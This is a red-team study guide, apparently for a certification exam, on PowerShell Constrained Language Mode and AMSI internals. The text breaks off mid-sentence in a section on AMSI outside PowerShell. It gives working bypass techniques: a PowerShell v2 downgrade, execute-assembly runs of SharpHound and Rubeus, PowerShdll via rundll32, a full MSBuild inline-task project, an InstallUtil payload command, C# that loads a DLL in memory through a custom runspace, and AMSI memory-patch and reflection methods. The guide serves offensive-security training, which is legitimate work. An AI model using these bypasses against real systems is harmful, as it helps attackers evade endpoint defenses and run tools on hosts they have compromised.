# Windows Constrained Language Mode & AMSI Architecture
## Deep Internals — From First Principles to Bypass

> **Teaching pattern used throughout:**
> 🔷 **WHAT** — What is this thing, defined simply
> 🔶 **WHY** — Why does Windows have it, what problem does it solve
> ⚔️ **HOW** — How attackers exploit or interact with it
> 🧠 **LOCK IT IN** — An analogy or visual to make it permanent

---

## Before You Begin — Why These Two Topics Are Connected

CLM and AMSI are **two separate security layers** that often activate together. They are not the same thing, they do not depend on each other, and bypassing one does not bypass the other. But in practice, when you land on a hardened machine, both are usually active simultaneously — and understanding which one is blocking you determines which bypass to apply.

```
You land a shell → open PowerShell → run a command → BLOCKED

Was it blocked by CLM?  → The language mode restricts what PowerShell CAN DO
Was it blocked by AMSI? → The scan engine flags what PowerShell TRIES TO DO

Different symptoms, different fixes, different bypasses.
```

This document treats them as two complete topics, then shows how they interact.

---

---

# PART 1 — CONSTRAINED LANGUAGE MODE (CLM)

---

## SECTION 1 — What Language Modes Are

**🔷 WHAT**

PowerShell has a property called **Language Mode** that controls what types of operations are allowed in the session. It is not a security product — it is a built-in PowerShell configuration that restricts which .NET types, COM objects, and script constructs can be used.

There are four language modes:

```
┌──────────────────────────────────────────────────────────────────────────┐
│  MODE                     │ WHAT'S ALLOWED                               │
├───────────────────────────┼──────────────────────────────────────────────┤
│  FullLanguage             │ Everything. All .NET types, COM objects,      │
│                           │ Add-Type, custom classes, arbitrary code.     │
│                           │ This is the DEFAULT on a normal workstation. │
├───────────────────────────┼──────────────────────────────────────────────┤
│  ConstrainedLanguage (CLM)│ Severely restricted. Only approved .NET      │
│                           │ types. No Add-Type. No custom classes.       │
│                           │ No arbitrary COM objects. No type casting    │
│                           │ to unapproved types. Basic cmdlets work.     │
│                           │ MOST offensive PowerShell tools break.       │
├───────────────────────────┼──────────────────────────────────────────────┤
│  RestrictedLanguage       │ Even more limited. No script blocks, no      │
│                           │ variables beyond predefined ones, no loops.  │
│                           │ Essentially read-only. Used in Data sections.│
├───────────────────────────┼──────────────────────────────────────────────┤
│  NoLanguage               │ Nothing. PowerShell processes commands only, │
│                           │ no script code at all. API-driven use only. │
└───────────────────────────┴──────────────────────────────────────────────┘
```

**Check your current mode:**

```powershell
$ExecutionContext.SessionState.LanguageMode
# Output: FullLanguage     ← you can do anything
# Output: ConstrainedLanguage  ← you are restricted
```

**🔶 WHY**

ConstrainedLanguage Mode exists because PowerShell became the most popular attack tool on Windows. Between 2013–2018, nearly every offensive tool was written in PowerShell: Mimikatz wrappers, AD enumeration, payload delivery, persistence. Microsoft's own telemetry showed PowerShell in the kill chain of the majority of Windows compromises.

The problem: PowerShell is too powerful. It gives direct access to the .NET framework, which in turn gives access to the Windows API, which means you can call any Windows function from a one-liner script. `Add-Type` compiles and loads arbitrary C# code. `[System.Reflection.Assembly]::Load()` loads arbitrary .NET assemblies in memory. `New-Object -ComObject` creates arbitrary COM objects. All of this is by design — and all of it is abused by attackers.

**Microsoft's solution was not to disable PowerShell** — it is too integral to enterprise administration. Instead, they created a restricted mode where PowerShell can still function for administrative tasks (running cmdlets, basic scripts) but loses the dangerous extensibility that attackers rely on.

**⚔️ HOW**

CLM blocks the specific operations that offensive tools need:

```
BLOCKED in ConstrainedLanguage:
──────────────────────────────────────────────────────────────
Add-Type                    ← Cannot compile and load C# code
                              (AMSI bypass Method 1 requires this)

[System.Reflection.Assembly]::Load()
                            ← Cannot load arbitrary .NET assemblies
                              (in-memory tool loading breaks)

New-Object -ComObject <arbitrary>
                            ← Cannot create arbitrary COM objects
                              (some lateral movement tools need this)

Custom .NET type creation   ← Cannot define new types with PowerShell classes
                              (advanced scripts that define classes break)

Type casting to unapproved types
                            ← Cannot use most .NET framework types
                              ([System.Runtime.InteropServices.Marshal]
                               is blocked — breaks most memory patching)

STILL WORKS in ConstrainedLanguage:
──────────────────────────────────────────────────────────────
Basic cmdlets               ← Get-Process, Get-Service, Get-ChildItem
Pipeline                    ← command | command | command
Variables                   ← $x = "hello"
Approved .NET types         ← [string], [int], [array], [hashtable], [datetime]
                              [regex], [xml], [math] — safe types only
WMI cmdlets                 ← Get-WmiObject, Get-CimInstance
Basic string operations     ← split, join, replace, match
```

**Why this matters for red teaming**: Almost every offensive PowerShell script uses either `Add-Type` (to call Win32 API functions like VirtualProtect, GetProcAddress) or `[System.Reflection.Assembly]::Load()` (to load .NET tools in memory). Both are blocked in CLM. Your AMSI bypass (Method 1 and Method 2 both fail), your in-memory tool loading fails, and most of PowerView breaks.

**🧠 LOCK IT IN**

FullLanguage Mode is a workshop where you can use any tool, any machine, build anything — including weapons. ConstrainedLanguage Mode is the same workshop with everything bolted down except the screwdrivers and wrenches. You can still tighten screws (run cmdlets), but you cannot use the lathe (Add-Type), the forge (Assembly.Load), or the press (COM objects). The tools attackers need are specifically the ones removed.

---

## SECTION 2 — How CLM Gets Enabled

**🔷 WHAT**

CLM does not enable itself. Something must tell PowerShell to enter ConstrainedLanguage mode. There are exactly three mechanisms:

### Mechanism 1: AppLocker (most common in enterprises)

When AppLocker is configured with **script rules** — even a single rule, even a permissive one — PowerShell automatically enters ConstrainedLanguage Mode for any script that is not explicitly allowed by the AppLocker policy.

```
AppLocker configured with script rule:
  "Allow all scripts signed by CORP CA"
      ↓
PowerShell starts:
  → PowerShell checks: is AppLocker active with script rules?
  → YES → enter ConstrainedLanguage Mode for all unsigned/untrusted scripts
  → Scripts signed by CORP CA → run in FullLanguage
  → Scripts from C:\Windows\* (if allowed by path rule) → FullLanguage
  → Everything else → ConstrainedLanguage
```

**The key insight**: AppLocker does not just block scripts from running. Its *presence* causes PowerShell to downgrade the language mode for scripts it does not explicitly trust.

### Mechanism 2: WDAC (Windows Defender Application Control)

WDAC is the modern replacement for AppLocker. It operates at the kernel level (more robust than AppLocker's user-mode enforcement). When a WDAC policy is active, PowerShell enters ConstrainedLanguage for any script not covered by the policy.

```
WDAC is significantly harder to bypass than AppLocker:
  AppLocker → user-mode enforcement → bypassable from user mode
  WDAC → kernel-mode enforcement → bypasses require kernel-level flaws
```

### Mechanism 3: System-wide environment variable (rare, easy to bypass)

```powershell
# This forces CLM system-wide (but is trivially bypassable)
[Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')

# After setting, all new PS sessions start in ConstrainedLanguage
# Bypass: just set it back to 0 if you have admin
```

This method is almost never used in real enterprises. AppLocker or WDAC is the real mechanism.

**🔶 WHY**

The connection to AppLocker is deliberate: Microsoft designed CLM to be the enforcement partner of application whitelisting. The logic is:

1. AppLocker controls which executables and scripts can run
2. If a script IS allowed to run, it might still try to use PowerShell as a toolbox
3. CLM ensures that even allowed scripts cannot use the dangerous .NET extensibility
4. Only explicitly trusted scripts (signed, from approved paths) get full language access

Without CLM, AppLocker is incomplete — an allowed script could simply call `Add-Type` and compile malicious code at runtime, bypassing the application whitelist entirely.

**⚔️ HOW**

**Checking how CLM was enabled determines which bypass to use:**

```powershell
# Check language mode
$ExecutionContext.SessionState.LanguageMode

# If ConstrainedLanguage → check what's enforcing it:

# Is AppLocker active?
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

# Is WDAC active?
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
    Select-Object -Property *CodeIntegrity*

# Is the environment variable set? (weak enforcement)
[Environment]::GetEnvironmentVariable('__PSLockdownPolicy', 'Machine')
```

**🧠 LOCK IT IN**

CLM is a mode. AppLocker is the switch that turns it on. You cannot bypass the mode without understanding which switch activated it — because each switch has a different wiring that requires a different approach to disable.

---

## SECTION 3 — What Exactly Breaks in CLM

**🔷 WHAT**

Understanding *precisely* what CLM blocks lets you know which of your tools will work, which will partially work, and which will completely fail.

### Offensive tools that COMPLETELY BREAK in CLM

```
PowerView.ps1
  → Uses Add-Type, custom .NET classes, DirectorySearcher objects
  → FAILS: "Cannot invoke method. Method invocation is supported
     only on core types in this language mode."

Invoke-Mimikatz.ps1
  → Uses Add-Type to compile and load Mimikatz DLL from memory
  → FAILS at Add-Type call

AMSI bypass Method 1 (AmsiScanBuffer patch)
  → Uses Add-Type to declare Win32 API functions (VirtualProtect, GetProcAddress)
  → FAILS at Add-Type call

AMSI bypass Method 2 (amsiInitFailed reflection)
  → Uses [Ref].Assembly.GetType() and GetField() — reflection on internal types
  → FAILS: "Cannot invoke method on type System.Reflection.Assembly"

Custom shellcode loaders
  → [System.Runtime.InteropServices.Marshal]::Copy() is blocked
  → FAILS at Marshal type access

Invoke-Command with scriptblocks
  → Complex scriptblocks may fail if they use restricted types

Empire / Covenant / most PowerShell C2 stagers
  → Almost all use Add-Type or Assembly.Load
  → FAIL
```

### What STILL WORKS in CLM

```
Basic enumeration cmdlets:
  whoami, hostname, ipconfig, systeminfo
  Get-Process, Get-Service, Get-ChildItem
  Get-WmiObject Win32_Service
  Get-LocalUser, Get-LocalGroup, Get-LocalGroupMember

Basic file operations:
  Get-Content, Set-Content, Copy-Item, Remove-Item

Network:
  Test-NetConnection -ComputerName target -Port 5985
  Invoke-WebRequest (basic GET — but loading scripts and IEX may fail)

WMI:
  Get-CimInstance Win32_OperatingSystem
  Get-CimInstance Win32_Process | Select Name, ProcessId, ParentProcessId

Registry:
  Get-ItemProperty HKLM:\SOFTWARE\...
  Set-ItemProperty HKCU:\SOFTWARE\...  (if you have write access)
```

**🔶 WHY**

The approved types list is curated by Microsoft to include types that are useful for administration but not exploitable for offensive operations. `[string]`, `[int]`, `[datetime]` are safe. `[System.Runtime.InteropServices.Marshal]` (which lets you read/write arbitrary memory) is not. The line is drawn at types that enable code execution, memory manipulation, or dynamic code compilation.

**⚔️ HOW**

**The diagnostic flow when you hit CLM:**

```
Command fails with "Method invocation is supported only on core types"
or "Cannot create type. Only core types are supported in this language mode."
         ↓
Confirm: $ExecutionContext.SessionState.LanguageMode → ConstrainedLanguage
         ↓
Question: Can I avoid PowerShell entirely?
  → YES: use execute-assembly via C2 (bypasses PS completely)
  → YES: use compiled .NET binary directly
  → YES: use cmd.exe + LOLBins for basic tasks
         ↓
If I MUST use PowerShell:
  → Try CLM bypass (Section 4)
         ↓
If bypass fails:
  → Enumerate with what works (WMI, basic cmdlets, registry)
  → Transfer findings to Kali, use Linux tools from there
```

**🧠 LOCK IT IN**

When CLM is active, PowerShell is a calculator that has been switched from "scientific" mode to "basic" mode. Addition and subtraction still work. But trigonometry, logarithms, and programmer functions are greyed out. The calculator still runs — it just cannot do the advanced operations. Your offensive tools need the advanced operations. The basic ones handle simple reconnaissance and file operations.

---

## SECTION 4 — CLM Bypass Techniques

**🔷 WHAT**

CLM is enforced by PowerShell itself — specifically by the `System.Management.Automation` assembly. It is not a kernel-level protection (unless WDAC is the enforcement mechanism). This means there are multiple ways around it.

### Bypass 1: PowerShell Version 2 Downgrade

**The mechanism:**

PowerShell version 2 predates CLM — the concept did not exist in PowerShell 2.0. If the .NET Framework v2.0 (which PS v2 requires) is installed on the machine, you can start a PowerShell v2 session that runs in FullLanguage regardless of AppLocker/CLM settings.

```powershell
# Check if PS v2 is available
reg query "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
# If output shows 2.0 → available

# Check if .NET 2.0/3.5 is installed (required for PS v2)
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727"
# Or check the feature:
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2

# Launch PS v2
powershell -version 2

# Check language mode
$ExecutionContext.SessionState.LanguageMode
# Expected: FullLanguage  ← CLM bypassed
```

**Why this works:**

PowerShell v2 uses a completely different engine (`System.Management.Automation` v2) that does not implement the ConstrainedLanguage mode check. The AppLocker-triggered CLM enforcement was added in PowerShell v5. V2 does not know about it.

**When this fails:**

- .NET Framework v2.0/3.5 is not installed (removed on newer Windows Server builds)
- PowerShell v2 engine feature is explicitly disabled by GPO
- WDAC is enforcing (kernel-level — blocks the PS v2 engine binary itself)

**Detection:**

```
Event 400: PowerShell engine starts with EngineVersion=2.0
  → Every SIEM rule for PS downgrade attack watches for this
  → Extremely well-known, extremely monitored
```

### Bypass 2: Use C2 execute-assembly (avoid PowerShell entirely)

**The mechanism:**

CLM restricts PowerShell. It does not restrict .NET execution generally. Your C2 beacon (Sliver, Havoc, Mythic) can load and execute .NET assemblies directly in the beacon's own process using `Assembly.Load()` — this is not a PowerShell session, so CLM does not apply.

```bash
# Your beacon runs as a native process, not PowerShell
# execute-assembly calls Assembly.Load inside the beacon process
# The beacon is not constrained by PowerShell's language mode

sliver (beacon) > execute-assembly ~/tools/SharpHound.exe -c All --zip
sliver (beacon) > execute-assembly ~/tools/Rubeus.exe kerberoast /nowrap
sliver (beacon) > execute-assembly ~/tools/Seatbelt.exe -group=all
```

**Why this works:**

CLM is a PowerShell-internal restriction. The .NET CLR (Common Language Runtime) itself has no such restriction. A native process (your beacon) hosting the CLR can load any assembly. The CLM check only exists inside the `System.Management.Automation` assembly that powers PowerShell.

```
PowerShell.exe → loads System.Management.Automation → checks CLM → restricts
Beacon.exe     → loads CLR directly → no System.Management.Automation → no CLM check
                  Assembly.Load() works normally
```

**This is the correct approach on the exam.** Do not fight CLM when your C2 can run .NET tools directly.

### Bypass 3: PowerShdll — PowerShell in a DLL

**The mechanism:**

PowerShdll is a DLL that hosts the PowerShell engine. When loaded via `rundll32.exe`, it creates a PowerShell runspace in the context of the `rundll32.exe` process. Depending on how `rundll32` is treated by AppLocker, this runspace may start in FullLanguage.

```cmd
# Download PowerShdll.dll to the target
# Execute via rundll32 (signed Microsoft binary)
rundll32 PowerShdll.dll,main

# A PowerShell prompt appears
# Check language mode:
$ExecutionContext.SessionState.LanguageMode
```

**Why this sometimes works:**

AppLocker evaluates the calling process. `rundll32.exe` is in `C:\Windows\System32\` and is usually allowed by default AppLocker rules. The PowerShell engine loaded inside `rundll32` may not trigger the same AppLocker script evaluation that `powershell.exe` does — because the script is not a standalone `.ps1` file; it is running inside a DLL loaded by an approved binary.

**When this fails:**

- AppLocker has strict DLL rules (rare — DLL rules are rarely enabled because they cause performance overhead)
- WDAC policy blocks the unsigned PowerShdll.dll
- EDR detects rundll32 loading a non-Microsoft DLL

### Bypass 4: MSBuild inline tasks

**The mechanism:**

MSBuild (`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe`) is a signed Microsoft build tool. It can execute inline C# tasks defined in a `.csproj` or `.xml` file. This C# code runs in FullLanguage equivalent — it is compiled and executed by the CLR, not by PowerShell.

```xml
<!-- bypass.csproj — save this to the target -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Exec">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;
          
          public class ClassExample : Task {
            public override bool Execute() {
              // Your C# code here — fully unrestricted
              // Can call Win32 API, load assemblies, anything
              Console.WriteLine("Running outside CLM as: " + 
                System.Security.Principal.WindowsIdentity.GetCurrent().Name);
              return true;
            }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe bypass.csproj
```

**Why this works:**

MSBuild compiles the inline C# code using the .NET compiler (`csc.exe`) and executes it. This is a completely separate code path from PowerShell. CLM has no influence over MSBuild's C# compilation. AppLocker typically allows MSBuild because it is a signed Microsoft binary in the Framework directory (usually covered by default allow rules).

**When this fails:**

- AppLocker has an explicit deny rule for MSBuild.exe
- WDAC blocks unsigned inline task execution
- EDR has behavioral detection for MSBuild running C# compilation outside of a build context

### Bypass 5: InstallUtil

```cmd
# Compile a C# payload with an Uninstall handler
# InstallUtil runs the Uninstall() method — which contains your code
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
```

Same concept as MSBuild — a signed .NET Framework binary that executes compiled C# outside of PowerShell's CLM.

### Bypass 6: Custom Runspace (for when you have code execution outside PS)

**The mechanism:**

If you have the ability to run compiled C# code (via MSBuild, InstallUtil, execute-assembly, or a dropped EXE), you can create a PowerShell runspace programmatically and configure it to run in FullLanguage:

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

public class BypassCLM {
    public static void Main() {
        // Create a runspace — it starts in FullLanguage if you
        // control the process and AppLocker doesn't apply to it
        Runspace rs = RunspaceFactory.CreateRunspace();
        rs.Open();
        
        PowerShell ps = PowerShell.Create();
        ps.Runspace = rs;
        
        // This runs in FullLanguage context
        ps.AddScript("$ExecutionContext.SessionState.LanguageMode");
        var result = ps.Invoke();
        Console.WriteLine(result[0]); // "FullLanguage"
        
        // Now run any offensive PS script
        ps.Commands.Clear();
        ps.AddScript("[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes('C:\\temp\\tool.dll'))");
        ps.Invoke();
    }
}
```

**Why this works:**

When you create a PowerShell runspace inside your own process, the language mode is determined by whether AppLocker evaluates that process. If the process is in an allowed path (or AppLocker has no policy for it), the runspace starts in FullLanguage. You are hosting the PS engine yourself — you control the configuration.

**🔶 WHY each bypass targets a different enforcement gap**

```
┌───────────────────────────────────────────────────────────────────────┐
│  BYPASS              │ ENFORCEMENT GAP                                │
├──────────────────────┼───────────────────────────────────────────────┤
│  PS v2 downgrade     │ CLM didn't exist in PS v2. Legacy gap.         │
│  execute-assembly    │ CLM is PS-only. CLR itself has no CLM.         │
│  PowerShdll          │ AppLocker evaluates powershell.exe, not dll    │
│  MSBuild             │ Signed MS binary. CLM doesn't cover C# builds.│
│  InstallUtil         │ Same gap as MSBuild.                           │
│  Custom Runspace     │ You host the PS engine — you set the mode.    │
└──────────────────────┴───────────────────────────────────────────────┘
```

**🧠 LOCK IT IN**

CLM is a lock on the PowerShell door. Bypass 1 (PS v2) is an old door that was built before locks existed. Bypass 2 (execute-assembly) is climbing through a window that has no lock. Bypass 3 (PowerShdll) is entering through a service entrance with a different lock. Bypass 4+5 (MSBuild/InstallUtil) are using a different building entirely that has no doors locked. Bypass 6 (Custom Runspace) is building your own door frame and setting it to "unlocked."

---

---

# PART 2 — AMSI ARCHITECTURE: The Complete Internal View

---

## SECTION 5 — AMSI as a System: The Full Architecture

**🔷 WHAT**

AMSI (Antimalware Scan Interface) is not a single component — it is a **framework** with multiple participants. Understanding the full architecture shows why certain bypasses work and where each participant can be attacked.

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        AMSI ARCHITECTURE                                │
│                                                                         │
│  ┌─────────────┐                                                        │
│  │ HOST APP    │  PowerShell, VBScript, JScript, .NET CLR, Office VBA  │
│  │             │  The application that wants content scanned.           │
│  │             │  Calls AmsiInitialize() on startup.                    │
│  │             │  Calls AmsiScanBuffer() before executing content.      │
│  └──────┬──────┘                                                        │
│         ↓                                                                │
│  ┌─────────────┐                                                        │
│  │ AMSI DLL    │  amsi.dll — loaded INTO the host app's process.       │
│  │             │  Provides the API functions:                           │
│  │             │  AmsiInitialize, AmsiOpenSession, AmsiScanBuffer,      │
│  │             │  AmsiScanString, AmsiCloseSession, AmsiUninitialize    │
│  │             │                                                        │
│  │             │  Routes scan requests to registered AMSI providers.    │
│  └──────┬──────┘                                                        │
│         ↓                                                                │
│  ┌─────────────┐                                                        │
│  │ AMSI        │  An antivirus product that registered itself as an    │
│  │ PROVIDER    │  AMSI content scanner. Can be:                         │
│  │             │  • Windows Defender (default, always present)          │
│  │             │  • CrowdStrike, SentinelOne, Carbon Black, etc.       │
│  │             │  • Multiple providers can be registered simultaneously │
│  │             │                                                        │
│  │             │  Receives content → scans against its signature DB →  │
│  │             │  returns: AMSI_RESULT_CLEAN or AMSI_RESULT_DETECTED   │
│  └─────────────┘                                                        │
│                                                                         │
│  KEY FACT: amsi.dll runs INSIDE the host application's process.        │
│  It shares the same virtual address space as your PowerShell session.   │
│  You can modify it from the same process.                               │
│  This is the fundamental design decision that enables patching.         │
└─────────────────────────────────────────────────────────────────────────┘
```

**🔶 WHY**

Microsoft designed AMSI as an **in-process** architecture for performance reasons. Script engines (PowerShell, VBScript) execute content line by line at high speed. Sending every script block to an external scanning service would introduce unacceptable latency. Instead, the scanning DLL is loaded directly into the same process — function calls within the same process are near-instantaneous.

The tradeoff: in-process code can be modified by the process it lives in. This is the same design tradeoff that makes userland EDR hooks bypassable — and it is by design.

**⚔️ HOW**

Each participant in the architecture is an independent attack surface:

```
ATTACK SURFACE 1: The host application (PowerShell)
  → amsiInitFailed reflection bypass — modify PowerShell's internal flag
  → PowerShell checks this flag before calling AmsiScanBuffer
  → Set flag to true → PowerShell never calls AMSI → no scan happens

ATTACK SURFACE 2: amsi.dll (AmsiScanBuffer function)
  → Memory patching bypass — overwrite AmsiScanBuffer's first bytes
  → Function returns error immediately → no scan sent to provider
  → Host interprets the error as "scan unavailable" → content runs

ATTACK SURFACE 3: The AMSI provider registration
  → Invisi-Shell bypass — hook the CLR profiler registration path
  → Register a null/dummy AMSI provider that always returns clean
  → Real Defender provider never gets called

ATTACK SURFACE 4: The content itself
  → String obfuscation — split known-bad strings
  → Content that is not signatured passes the scan normally
  → Not a bypass of AMSI — a bypass of the provider's signatures
```

**🧠 LOCK IT IN**

AMSI is a quality control inspection station built into the factory floor (the process). The inspector (Defender provider) sits at the station. Products (script blocks) pass through the station before going to the packaging line (execution).

Attack surface 1: Tell the factory foreman (PowerShell) the inspection station is broken — he skips it.
Attack surface 2: Break the conveyor belt at the inspection station — products flow past without stopping.
Attack surface 3: Replace the inspector with a mannequin — products pass inspection automatically.
Attack surface 4: Disguise your product so the inspector does not recognise it — it passes legitimately.

---

## SECTION 6 — The AMSI Function Call Chain in Detail

**🔷 WHAT**

When PowerShell is about to execute a script block, here is the exact sequence of function calls that occurs:

```
PHASE 1: INITIALISATION (happens once when PowerShell starts)
──────────────────────────────────────────────────────────────
powershell.exe starts
    ↓
System.Management.Automation loads
    ↓
AmsiInitialize(appName="PowerShell_C:\Windows\...", &amsiContext)
    → amsi.dll creates a context handle for this session
    → Locates registered AMSI providers via COM registry
    → Returns amsiContext (used in all subsequent calls)
    ↓
AmsiOpenSession(amsiContext, &amsiSession)
    → Opens a scanning session — groups related scans together
    → Returns amsiSession handle
    ↓
PowerShell stores both handles internally
Sets amsiInitFailed = false (initialisation succeeded)


PHASE 2: SCANNING (happens for EVERY script block)
──────────────────────────────────────────────────────────────
User types: Invoke-Mimikatz
    ↓
PowerShell prepares the script block for execution
    ↓
PowerShell internal check:
    if (amsiInitFailed == true) {
        // Skip scanning entirely — AMSI was not available
        goto execute;
    }
    ↓
AmsiScanBuffer(
    amsiContext,           // from AmsiInitialize
    bufferToScan,          // "Invoke-Mimikatz" as bytes
    bufferLength,          // length of the content
    contentName,           // "PowerShell_script" label
    amsiSession,           // from AmsiOpenSession
    &result                // output: the scan result
)
    ↓
amsi.dll internally:
    → Validates parameters
    → Calls IAntimalwareProvider::Scan() on each registered provider
    → Windows Defender's provider receives the content
    → Defender checks content against AMSI signature database
    → Defender returns: AMSI_RESULT_DETECTED (32768)
    ↓
AmsiScanBuffer returns:
    HRESULT = S_OK (0x00000000) — function succeeded
    result = AMSI_RESULT_DETECTED — content is malicious
    ↓
PowerShell checks result:
    if (result >= AMSI_RESULT_DETECTED) {
        throw "This script contains malicious content and has been blocked"
        // Script block DOES NOT EXECUTE
    }
    
    if (HRESULT is error code) {
        // AMSI call failed — treat as "scan unavailable"
        // Content is ALLOWED to execute
        // ← This is what the patch exploit uses
    }
    ↓
execute:
    // Script block runs normally
```

**🔶 WHY**

The dual-check architecture (HRESULT + result) exists because Microsoft needs to distinguish between:
- "The scan ran and found nothing wrong" (HRESULT=OK, result=CLEAN) → allow
- "The scan ran and found a threat" (HRESULT=OK, result=DETECTED) → block
- "The scan could not run" (HRESULT=error) → allow (graceful degradation)

The third case — graceful degradation — is the design decision that the memory patch exploits. When `AmsiScanBuffer` returns an error HRESULT (like `0x80070057` — E_INVALIDARG), PowerShell interprets this as "AMSI is not working properly" and allows execution. This prevents a broken AMSI from making PowerShell completely unusable.

**⚔️ HOW**

**Each bypass targets a specific point in this chain:**

```
Bypass Method 1 (AmsiScanBuffer patch):
  → Targets: AmsiScanBuffer's entry point in amsi.dll
  → Overwrites first bytes to: MOV EAX, 0x80070057; RET
  → Effect: AmsiScanBuffer returns error HRESULT immediately
  → PowerShell: "AMSI failed" → allows execution

Bypass Method 2 (amsiInitFailed flag):
  → Targets: PowerShell's internal check BEFORE AmsiScanBuffer is called
  → Sets amsiInitFailed = true via .NET reflection
  → Effect: PowerShell's if-check passes → skips AmsiScanBuffer entirely
  → AmsiScanBuffer is never called at all

Bypass Method 3 (Invisi-Shell / CLR profiler):
  → Targets: PHASE 1 — the initialisation step
  → Hooks the CLR profiler API during PowerShell startup
  → Replaces the real AMSI provider with a null provider
  → Effect: AmsiScanBuffer IS called, but the provider always returns CLEAN
  → PowerShell sees AMSI_RESULT_CLEAN → allows execution

String obfuscation (not a bypass):
  → Targets: the PROVIDER's signature matching
  → Changes the content so Defender's signatures don't match
  → Effect: AmsiScanBuffer IS called, provider IS consulted, returns CLEAN
  → PowerShell allows execution because provider said it's safe
```

**🧠 LOCK IT IN**

```
The call chain is a highway with three checkpoints:

Checkpoint 1 (amsiInitFailed check):
  "Is the inspection station even open?"
  → Bypass 2 puts up a "CLOSED" sign. No traffic reaches Checkpoint 2.

Checkpoint 2 (AmsiScanBuffer function):
  "Run the scan."
  → Bypass 1 replaces the scanner with a machine that always says PASS.

Checkpoint 3 (AMSI provider):
  "Does this content match any known-bad signatures?"
  → Bypass 3 replaces the inspector. Obfuscation disguises the content.

Each bypass attacks a different checkpoint. Understanding which checkpoint
your bypass targets tells you what it does and does not protect against.
```

---

## SECTION 7 — AMSI Provider Registration Deep Dive

**🔷 WHAT**

AMSI providers are registered via COM (Component Object Model) in the Windows registry. Any antivirus vendor can register as an AMSI provider by adding a COM class to a specific registry key.

```
Registration location:
  HKLM\SOFTWARE\Microsoft\AMSI\Providers\

Each provider is a CLSID:
  HKLM\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}
  → This CLSID points to: Windows Defender's AMSI provider DLL
  → The DLL is: MpOav.dll (Microsoft Protection OAV)

To find all registered AMSI providers:
  reg query "HKLM\SOFTWARE\Microsoft\AMSI\Providers"
```

When `AmsiInitialize` runs, it:
1. Enumerates all CLSIDs under `HKLM\SOFTWARE\Microsoft\AMSI\Providers\`
2. For each CLSID: CoCreateInstance → loads the provider DLL into the process
3. Calls `IClassFactory::CreateInstance` → gets an `IAntimalwareProvider` interface
4. Stores all provider interfaces in a list
5. On each `AmsiScanBuffer` call → iterates the list and calls each provider's `Scan()`

**🔶 WHY**

The COM-based registration enables any AV vendor to plug into AMSI without modifying Windows itself. Defender is the default provider, but CrowdStrike, SentinelOne, and others register their own providers alongside (or instead of) Defender.

Multiple providers can coexist — `AmsiScanBuffer` calls ALL of them and blocks if ANY returns DETECTED. This means you need to defeat every registered provider, not just Defender.

**⚔️ HOW**

**Knowing who the AMSI provider is tells you what signatures to expect:**

```
Defender (MpOav.dll):
  → Updates signatures multiple times daily
  → Very fast pattern matching
  → AMSI-specific signatures exist for all known bypasses
  → Strings like "AmsiUtils", "AmsiScanBuffer", "Invoke-Mimikatz" are signatured

CrowdStrike (CSFalcon AMSI provider):
  → Different signature database
  → Also behavioral analysis within the AMSI provider
  → May catch obfuscated variants that Defender misses

SentinelOne:
  → Yet another signature set
  → Deep inspection of script structure, not just strings

Enterprise environments may have multiple providers active simultaneously.
→ Patching AmsiScanBuffer defeats ALL providers (it runs before any provider is called)
→ amsiInitFailed defeats ALL providers (AmsiScanBuffer is never called)
→ String obfuscation must defeat EACH provider's signatures independently
```

**Provider detection in practice:**

```powershell
# Which AV is running? (tells you which AMSI provider to expect)
Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntivirusProduct |
    Select displayName, pathToSignedProductExe

# Check registered AMSI providers directly
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -Recurse
```

**🧠 LOCK IT IN**

AMSI providers are restaurant health inspectors. The AMSI framework is the inspection booth inside the restaurant. Microsoft built the booth (amsi.dll). Different inspection agencies (Defender, CrowdStrike, SentinelOne) each send their own inspector who sits in the booth and checks dishes (script blocks) before they leave the kitchen (execute). Patching AmsiScanBuffer is breaking the booth — no inspector ever sees anything, regardless of which agency sent them. Obfuscation is making your dish look different so the specific inspector on duty does not recognise it — but a different inspector with different training might.

---

## SECTION 8 — AMSI in Non-PowerShell Contexts

**🔷 WHAT**

AMSI is not PowerShell-only. It is loaded into every process that hosts a scripting engine or the .NET CLR. Each context has a different integration point:

```
┌───────────────────────────────────────────────────────────────────────┐
│  HOST APPLICATION        │ WHAT AMSI SCANS                           │
├──────────────────────────┼───────────────────────────────────────────┤
│  powershell.exe          │ Every script block before execution       │
│                          │ Every command entered interactively       │
│                          │ Every module loaded via Import-Module     │
├──────────────────────────┼───────────────────────────────────────────┤
│  wscript.exe / cscript.exe│ VBScript and JScript content            │
│                          │ (macros, HTA files, .vbs scripts)        │
├──────────────────────────┼───────────────────────────────────────────┤
│  mshta.exe               │ HTA content (HTML Applications)          │
│                          │ Script blocks within the HTA              │
├──────────────────────────┼───────────────────────────────────────────┤
│  .NET CLR (any process)  │ Assembly.Load() calls (what's being loaded)│
│                          │ Triggered when any .NET assembly is loaded │
│                          │ in ANY process — not just PowerShell       │
│                          │ ← This is why execute-assembly may still  │
│                          │   be caught if the assembly name or       │
